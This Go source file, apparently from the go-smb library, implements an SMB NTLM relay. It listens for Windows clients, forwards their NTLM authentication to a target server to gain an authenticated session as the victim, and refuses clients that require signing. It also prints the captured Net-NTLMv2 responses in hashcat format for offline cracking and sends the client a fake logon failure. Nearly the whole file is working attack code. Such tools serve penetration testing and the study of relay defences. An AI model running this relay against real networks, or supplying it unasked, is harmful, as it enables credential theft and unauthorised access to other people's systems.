// MIT License
//
// # Copyright (c) 2023 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
package smb

import (
	"bytes"
	"crypto/rand"
	"encoding/asn1"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"sync/atomic"
	"time"

	"github.com/jfjallid/go-smb/gss"
	"github.com/jfjallid/go-smb/ntlmssp"
	"github.com/jfjallid/go-smb/smb/encoder"
)

// Useful with a generic struct when we don't know if this is a Negotiate or Auth message
type SessionSetupReq struct {
	Header
	StructureSize        uint16
	Flags                byte
	SecurityMode         byte
	Capabilities         uint32
	Channel              uint32
	SecurityBufferOffset uint16 `smb:"offset:SecurityBlob"`
	SecurityBufferLength uint16 `smb:"len:SecurityBlob"`
	PreviousSessionID    uint64
	SecurityBlob         []byte
}

// Useful with a generic struct when we wan't to respond with LOGON FAILURE and an empty SecurityBlob
type SessionSetupRes struct {
	Header
	StructureSize        uint16
	Flags                uint16
	SecurityBufferOffset uint16 `smb:"offset:SecurityBlob"`
	SecurityBufferLength uint16 `smb:"len:SecurityBlob"`
	SecurityBlob         []byte
}

func convertToHashcatFormat(username, domain, lmResponse, ntResponse []byte, serverChallenge uint64) (hashStr, hashVersion string) {
	/*
	   For Net-NTLMv2 hashcat format:
	   User::Domain:serverChallenge:HMAC-MD5(NTProofStr):NTLMv2Response(without HMAC)
	   Where HMAC-MD5 is the first 16 bytes of the NTLMv2Response

	   Currently only extraction of Net-NTLMv2 is supported
	*/
	challenge := make([]byte, 8)
	binary.LittleEndian.PutUint64(challenge, serverChallenge)

	if len(ntResponse) > 24 {
		hashStr = fmt.Sprintf("%s::%s:%x:%x:%x", username, domain, challenge, ntResponse[:16], ntResponse[16:])
		hashVersion = "Net-NTLMv2"
	} else {
		log.Infoln("Not yet implemented handling of non Net-NTLMv2 hashes")
		return
		//hashVersion = "Net-NTLMv1"
	}

	return
}
func sendPacket(conn net.Conn, buf []byte) (n int, err error) {

	b := new(bytes.Buffer)
	if err = binary.Write(b, binary.BigEndian, uint32(len(buf))); err != nil {
		log.Debugln(err)
		return
	}
	_, err = b.Write(buf)
	if err != nil {
		log.Errorln(err)
		return
	}
	n, err = conn.Write(b.Bytes())
	if err != nil {
		log.Errorln(err)
		return
	}
	return
}

func sendSMB2SessionSetupFailureRes(clientConn net.Conn, sessionId uint64, statusCode uint32) (err error) {
	log.Debugln("Sending fake SessionSetup logon failure response")
	res := SessionSetupRes{
		Header:        newHeader(),
		StructureSize: 0x9,
	}
	res.Command = CommandSessionSetup
	res.Status = statusCode
	res.Header.Flags = 0x1 // Response
	res.SessionID = sessionId

	ssResBytes, err := encoder.Marshal(res)
	if err != nil {
		log.Debugln(err)
		return err
	}

	_, err = sendPacket(clientConn, ssResBytes)
	if err != nil {
		log.Errorln(err)
		return err
	}
	return
}

func sendSMB2NegResponse(clientConn net.Conn) error {
	log.Debugln("Sending NegotiateProtocol response")
	res := NewNegotiateRes()
	res.DialectRevision = DialectSmb_2_1
	res.MaxReadSize = 65536
	res.MaxWriteSize = 65536
	res.MaxTransactSize = 65536

	serverGUID := make([]byte, 16)
	_, err := rand.Read(serverGUID)
	if err != nil {
		log.Errorln(err)
		return err
	}
	res.ServerGuid = serverGUID
	ft := ntlmssp.ConvertToFileTime(time.Now())
	res.SystemTime = ft
	res.ServerStartTime = ft
	res.SecurityBlob = &gss.NegTokenInit{
		OID: gss.SpnegoOid,
		Data: gss.NegTokenInitData{
			MechTypes: []asn1.ObjectIdentifier{gss.NtLmSSPMechTypeOid},
		},
	}

	negResBytes, err := encoder.Marshal(res)
	if err != nil {
		log.Debugln(err)
		return err
	}

	_, err = sendPacket(clientConn, negResBytes)
	if err != nil {
		log.Errorln(err)
		return err
	}

	return nil
}

func sendSMB2SessionSetup1Res(clientConn net.Conn, responseToken []byte, sessionID uint64) (err error) {
	log.Debugln("Sending SessionSetup1 response")
	res, _ := NewSessionSetup1Res()
	res.Command = CommandSessionSetup
	res.Status = StatusMoreProcessingRequired
	res.SessionID = sessionID
	res.MessageID = 1
	res.SecurityBlob.State = gss.GssStateAcceptIncomplete
	res.SecurityBlob.SupportedMech = gss.NtLmSSPMechTypeOid

	// Can and should I modify any value in the ResponseToken?
	res.SecurityBlob.ResponseToken = responseToken

	ssResBytes, err := encoder.Marshal(res)
	if err != nil {
		log.Debugln(err)
		return err
	}

	_, err = sendPacket(clientConn, ssResBytes)
	if err != nil {
		log.Errorln(err)
		return err
	}
	return
}

func (c *Connection) sendSessionSetup1ReqWithToken(token []byte) (responseToken []byte, err error) {
	log.Debugln("Sending SessionSetup1 request")
	initBytes, err := gss.NewNegTokenInit(nil, token)
	if err != nil {
		log.Errorln(err)
		return
	}
	var init gss.NegTokenInit
	err = encoder.Unmarshal(initBytes, &init)
	if err != nil {
		log.Errorln(err)
		return
	}

	init.Data.MechToken = token

	ssreq := SessionSetup1Req{
		Header:               newHeader(),
		StructureSize:        25,
		Flags:                0x00,
		Capabilities:         GlobalCapLargeMTU,
		Channel:              0,
		SecurityBufferOffset: 88,
		SecurityBufferLength: 0,
		PreviousSessionID:    0,
		SecurityBlob:         &init,
	}
	ssreq.Header.Command = CommandSessionSetup

	ssres, err := NewSessionSetup1Res()
	if err != nil {
		log.Debugln(err)
		return
	}

	ssresbuf, err := c.sendrecv(ssreq)
	if err != nil {
		log.Errorln(err)
		return
	}

	if err = encoder.Unmarshal(ssresbuf, &ssres); err != nil {
		log.Debugln(err)
		return
	}

	responseToken = ssres.SecurityBlob.ResponseToken

	if ssres.Header.Status != StatusMoreProcessingRequired {
		status, found := StatusMap[ssres.Header.Status]
		if !found {
			err = fmt.Errorf("Received unknown SMB Header status for SessionSetup1 response: 0x%x\n", ssres.Header.Status)
			log.Errorln(err)
			return
		}
		log.Debugf("NT Status Error: %v\n", status)
		err = status
		return
	}

	c.sessionID = ssres.Header.SessionID
	return
}

func NewRelayConnection(opt Options) (c *Connection, err error) {
	l, err := net.Listen("tcp4", fmt.Sprintf("0.0.0.0:%d", opt.RelayPort))
	if err != nil {
		log.Errorln(err)
		return
	}

	defer l.Close()

	// Read packets until client has authenticated
	var activeSession bool
	var packet []byte
	var clientConn net.Conn
	var authUsername string
	var serverChallenge uint64
	log.Noticef("SMB Relay started on port %d. Waiting for incoming connections.\n", opt.RelayPort)

ClientLoop:
	for {
		clientConn, err = l.Accept()
		if err != nil {
			log.Errorln(err)
			return
		}
		defer clientConn.Close()
		log.Noticef("Client connected from %s\n", clientConn.RemoteAddr().String())

		if c == nil {
			c = &Connection{
				outstandingRequests: newOutstandingRequests(),
				rdone:               make(chan struct{}, 1),
				wdone:               make(chan struct{}, 1),
				write:               make(chan []byte, 1),
				werr:                make(chan error, 1),
			}

			c.Session = &Session{
				IsSigningRequired: atomic.Bool{},
				IsAuthenticated:   false,
				IsSigningDisabled: true,
				clientGuid:        make([]byte, 16),
				options:           opt,
				trees:             make(map[string]uint32),
			}
			c.Session.options.ForceSMB2 = true
			c.Session.options.DisableEncryption = true

			authUsername = ""

			// Keep track of when we've initiated a session with the target and
			// launched go routines to read and write packets on connection.
			activeSession = false
		}

		for {
			// Read packet. We don't know if this is SMB or SMB2
			packet, err = readPacket(clientConn)
			if err != nil {
				log.Errorln(err)
				// Wait for the next client
				clientConn.Close()
				continue ClientLoop
			}
			if bytes.Compare(packet[:4], []byte(ProtocolSmb)) == 0 {
				log.Debugln("Received SMB1 packet from client")
				// SMB1
				h := SMB1Header{}
				if err = encoder.Unmarshal(packet[:32], &h); err != nil {
					log.Errorln(err)
					// Wait for the next client
					clientConn.Close()
					continue ClientLoop
				}
				if h.Command != SMB1CommandNegotiate {
					log.Errorln("Unknown SMB1 command when expecting Negotiate")
					log.Debugf("Received SMB1 command: %x but expected %x (Negotiate Protocol)\n", h.Command, SMB1CommandNegotiate)
					// Wait for the next client
					clientConn.Close()
					continue ClientLoop
				}
				// Respond with SMB2
				// Send response and then wait for the next packet
				err = sendSMB2NegResponse(clientConn)
				if err != nil {
					log.Errorln(err)
					return
				}
				log.Debugln("Sent SMB2 Negotiate Protocol response to client")
			} else {
				log.Debugln("Received SMB2 packet") //hopefully
				// Assume it's SMB2
				var h Header
				if err = encoder.Unmarshal(packet[:64], &h); err != nil {
					log.Errorln("Failed to decode header of packet")
					// Wait for the next client
					clientConn.Close()
					continue ClientLoop
				}
				// Check structure size
				if h.StructureSize != 64 {
					log.Errorln("Invalid structure size of packet")
					// Wait for the next client
					clientConn.Close()
					continue ClientLoop
				}

				switch h.Command {
				case CommandNegotiate:
					log.Debugln("Got command negotiate from client")
					var neg NegotiateReq
					if err = encoder.Unmarshal(packet, &neg); err != nil {
						log.Errorln(err)
						// Wait for the next client
						clientConn.Close()
						continue ClientLoop
					}
					if (neg.SecurityMode & SecurityModeSigningRequired) == SecurityModeSigningRequired {
						log.Errorln("Client requires SMB Signing which won't work for relaying")
						clientConn.Close()
						continue ClientLoop
					}
					foundSupportDialect := false
					for _, d := range neg.Dialects {
						if d == DialectSmb_2_1 || d == DialectSmb_2_0_2 {
							foundSupportDialect = true
							break
						}
					}
					if !foundSupportDialect {
						log.Errorf("Client does not support SMB 2.1 och 2.0.2 dialects, only: %v\n", neg.Dialects)
						clientConn.Close()
						continue ClientLoop
					}

					//NOTE Support other dialect than SMB 2.1?
					err = sendSMB2NegResponse(clientConn)
					if err != nil {
						log.Errorln(err)
						return
					}
				case CommandSessionSetup:
					log.Debugln("Got session setup packet from client")

					req := SessionSetupReq{}
					if err = encoder.Unmarshal(packet, &req); err != nil {
						log.Errorln(err)
						// Wait for the next client
						clientConn.Close()
						continue ClientLoop
					}
					messageType := byte(0)
					if req.SecurityBlob[0] == 0x60 {
						// GSS Negotiate Packet
						negTokenInit := gss.NegTokenInit{}
						if err := encoder.Unmarshal(req.SecurityBlob, &negTokenInit); err != nil {
							log.Errorln(err)
							// Wait for the next client
							clientConn.Close()
							continue ClientLoop
						}
						messageType = negTokenInit.Data.MechToken[len(ntlmssp.Signature) : len(ntlmssp.Signature)+1][0]
					} else if req.SecurityBlob[0] == 0xa1 {
						negTokenResp := gss.NegTokenResp{}
						if err := encoder.Unmarshal(req.SecurityBlob, &negTokenResp); err != nil {
							log.Errorln(err)
							// Wait for the next client
							clientConn.Close()
							continue ClientLoop
						}
						messageType = negTokenResp.ResponseToken[len(ntlmssp.Signature) : len(ntlmssp.Signature)+1][0]
						// GSS Authenticate Packet
					} else {
						err = fmt.Errorf("Unknown SessionSetup packet")
						log.Errorln(err)
						// Wait for the next client
						clientConn.Close()
						continue ClientLoop
					}
					switch messageType {
					case 0x1: // Negotiate
						log.Debugln("Session setup packet with command Negotiate from client")
						neg := NewSessionSetup1Req()
						if err = encoder.Unmarshal(packet, &neg); err != nil {
							log.Errorln(err)
							// Wait for the next client
							clientConn.Close()
							continue ClientLoop
						}

						if !activeSession {
							// Initiate a TCP connection with the target server
							if c.useProxy {
								c.conn, err = c.options.ProxyDialer.Dial("tcp", fmt.Sprintf("%s:%d", opt.Host, opt.Port))
							} else {
								c.conn, err = net.DialTimeout("tcp", fmt.Sprintf("%s:%d", opt.Host, opt.Port), opt.DialTimeout)
							}
							if err != nil {
								log.Errorln(err)
								return
							}

							go c.runSender()
							go c.runReceiver()
							// Negotiate protocol with the server
							err = c.NegotiateProtocol()
							if err != nil {
								log.Errorln(err)
								clientConn.Close()
								c.Close()
								c = nil
								continue ClientLoop
							}
							log.Debugln("Negotiated the protocol!")
							activeSession = true
						}

						// Forward the clients mechToken to the server in SessionSetup1Req
						responseToken, err := c.sendSessionSetup1ReqWithToken(neg.SecurityBlob.Data.MechToken)
						if err != nil {
							log.Errorln(err)
							clientConn.Close()
							c.Close()
							c = nil
							continue ClientLoop
						}

						challenge := ntlmssp.NewChallenge()
						if err = encoder.Unmarshal(responseToken, &challenge); err != nil {
							// Perhaps a bit unnecesssary to fail the client just because unmarshal failed?
							log.Errorln(err)
							clientConn.Close()
							c.Close()
							c = nil
							continue ClientLoop
						}

						serverChallenge = challenge.ServerChallenge

						err = sendSMB2SessionSetup1Res(clientConn, responseToken, c.sessionID)
						if err != nil {
							log.Errorln(err)
							clientConn.Close()
							c.Close()
							c = nil
							continue ClientLoop
						}

					case 0x3: // Authenticate
						log.Debugln("Session setup packet with command Authenticate from client")
						neg := SessionSetup2Req{
							SecurityBlob: &gss.NegTokenResp{},
						}
						if err = encoder.Unmarshal(packet, &neg); err != nil {
							log.Errorln(err)
							clientConn.Close()
							c.Close()
							c = nil
							continue ClientLoop
						}

						authenticate := ntlmssp.Authenticate{}
						if err = encoder.Unmarshal(neg.SecurityBlob.ResponseToken, &authenticate); err != nil {
							log.Errorln(err)
							clientConn.Close()
							c.Close()
							c = nil
							continue ClientLoop
						}
						authUsername = fmt.Sprintf("%s\\%s", authenticate.DomainName, authenticate.UserName)

						req2 := SessionSetup2Req{Header: newHeader(), StructureSize: 0x19}
						req2.Header.Command = CommandSessionSetup
						req2.Header.SessionID = c.sessionID
						// Any changes on the neg.SecurityBlob before passing it on?
						req2.SecurityBlob = neg.SecurityBlob

						ss2resbuf, err := c.sendrecv(req2)
						if err != nil {
							log.Errorln(err)
							clientConn.Close()
							c.Close()
							c = nil
							continue ClientLoop
						}

						log.Debugln("Unmarshalling SessionSetup2 response header")
						var authResp Header
						if err := encoder.Unmarshal(ss2resbuf, &authResp); err != nil {
							log.Errorln(err)
							log.Debugf("Error: %v\nRaw:\n%v\n", err, hex.Dump(ss2resbuf))
							clientConn.Close()
							c.Close()
							c = nil
							continue ClientLoop
						}
						if authResp.Status != StatusOk {
							if (authResp.Status == StatusLogonFailure) ||
								(authResp.Status == StatusAccountRestriction) ||
								(authResp.Status == StatusPasswordExpired) ||
								(authResp.Status == StatusAccountDisabled) ||
								(authResp.Status == StatusAccessDenied) {

								log.Infof("Client (%s) failed to authenticate as (%s) against (%s)", clientConn.RemoteAddr().String(), authUsername, c.conn.RemoteAddr().String())

								// Handle invalid login by passing it back to the client and hoping it tries again with other credentials
								err = sendSMB2SessionSetupFailureRes(clientConn, c.sessionID, authResp.Status)
								if err != nil {
									log.Errorln(err)
									// Don't need to exit just because client couldn't be terminated correctly
								}
								// Wait for the next client
								clientConn.Close()
								c.Close()
								c = nil
								continue ClientLoop
							} else {
								status, found := StatusMap[authResp.Status]
								if !found {
									err = fmt.Errorf("Received unknown SMB Header status for SessionSetup2 response: 0x%x\n", authResp.Status)
									log.Errorln(err)
									return nil, err
								}
								log.Debugf("NT Status Error: %v\n", status)
								return nil, status
							}
						}

						log.Debugln("Unmarshalling SessionSetup2 response")
						ssres2, _ := NewSessionSetup2Res()
						if err := encoder.Unmarshal(ss2resbuf, &ssres2); err != nil {
							log.Errorln(err)
							return nil, err
						}
						if ssres2.SecurityBlob.State != gss.GssStateAcceptCompleted {
							err = fmt.Errorf("Something went wrong with the autentication. Status success in SMB header but not in gss NegTokenResp")
							log.Errorln(err)
							return nil, err
						}

						c.IsAuthenticated = true
						c.enableSession()
						c.authUsername = authUsername
						log.Noticef("Client (%s) successfully authenticated as (%s) against (%s)!", clientConn.RemoteAddr().String(), authUsername, c.conn.RemoteAddr().String())

						hashcatStr, hashFormat := convertToHashcatFormat(authenticate.UserName, authenticate.DomainName, authenticate.LmChallengeResponse, authenticate.NtChallengeResponse, serverChallenge)
						fmt.Printf("%s Hash: %s\n", hashFormat, hashcatStr)

						// Respond negatively to the client
						err = sendSMB2SessionSetupFailureRes(clientConn, c.sessionID, StatusLogonFailure)
						if err != nil {
							log.Errorln(err)
							// Don't need to exit just because client couldn't be terminated correctly
						}

						break ClientLoop
					default:
						log.Errorf("Received unknown SMB2 SessionSetup packet: %+v\n", req)
						clientConn.Close()
						continue ClientLoop
					}
				default:
					log.Errorf("Unexpected packet with header: %+v\n", h)
					// Wait for the next client
					clientConn.Close()
					continue ClientLoop
				}
			}
		}
	}

	return
}
